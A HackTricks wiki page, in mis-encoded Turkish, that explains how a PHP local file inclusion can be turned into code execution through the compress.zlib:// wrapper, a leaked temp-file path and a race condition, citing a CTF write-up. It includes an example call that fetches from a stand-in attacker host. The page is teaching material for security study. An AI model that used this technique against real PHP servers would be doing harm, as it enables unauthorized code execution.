# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### `compress.zlib://` ve `PHP_STREAM_PREFER_STDIO`

`compress.zlib://` protokolÃ¼ kullanÄ±larak aÃ§Ä±lan bir dosya, `PHP_STREAM_PREFER_STDIO` bayraÄŸÄ± ile, baÄŸlantÄ±ya daha sonra gelen verileri aynÄ± dosyaya yazmaya devam edebilir.

Bu, aÅŸaÄŸÄ±daki gibi bir Ã§aÄŸrÄ±nÄ±n anlamÄ±na gelir:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Bir istek gÃ¶ndererek http://attacker.com/file adresini talep edecektir, ardÄ±ndan sunucu isteÄŸe geÃ§erli bir HTTP yanÄ±tÄ± ile yanÄ±t verebilir, baÄŸlantÄ±yÄ± aÃ§Ä±k tutabilir ve daha sonra dosyaya yazÄ±lacak ek veriler gÃ¶nderebilir.

Bu bilgiyi php-src kodunun main/streams/cast.c kÄ±smÄ±nda gÃ¶rebilirsiniz:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### YarÄ±ÅŸ KoÅŸulu ile RCE

[**Bu CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) Ã¶nceki hile kullanÄ±larak Ã§Ã¶zÃ¼ldÃ¼.

SaldÄ±rgan, **kurban sunucunun saldÄ±rganÄ±n sunucusundan bir dosya okuma baÄŸlantÄ±sÄ± aÃ§masÄ±nÄ±** saÄŸlayacaktÄ±r **`compress.zlib`** protokolÃ¼nÃ¼ kullanarak.

**Bu** **baÄŸlantÄ±** var olduÄŸu sÃ¼rece, saldÄ±rgan **oluÅŸturulan geÃ§ici dosyanÄ±n yolunu** **sÄ±zdÄ±racaktÄ±r** (sunucu tarafÄ±ndan sÄ±zdÄ±rÄ±lmÄ±ÅŸtÄ±r).

**BaÄŸlantÄ±** hala aÃ§Ä±kken, saldÄ±rgan **kontrol ettiÄŸi geÃ§ici dosyayÄ± yÃ¼kleyen bir LFI'yi** **istismar edecektir**.

Ancak, web sunucusunda **`<?`** iÃ§eren dosyalarÄ±n yÃ¼klenmesini **Ã¶nleyen** bir kontrol vardÄ±r. Bu nedenle, saldÄ±rgan bir **YarÄ±ÅŸ KoÅŸulu** istismar edecektir. Hala aÃ§Ä±k olan baÄŸlantÄ±da **saldÄ±rgan**, **web sunucusu** dosyanÄ±n yasaklÄ± karakterleri iÃ§erip iÃ§ermediÄŸini **kontrol ettikten SONRA** PHP yÃ¼kÃ¼nÃ¼ **gÃ¶nderecektir** ama **iÃ§eriÄŸini yÃ¼klemeden Ã–NCE**.

Daha fazla bilgi iÃ§in [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) adresindeki YarÄ±ÅŸ KoÅŸulu ve CTF aÃ§Ä±klamasÄ±nÄ± kontrol edin.

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
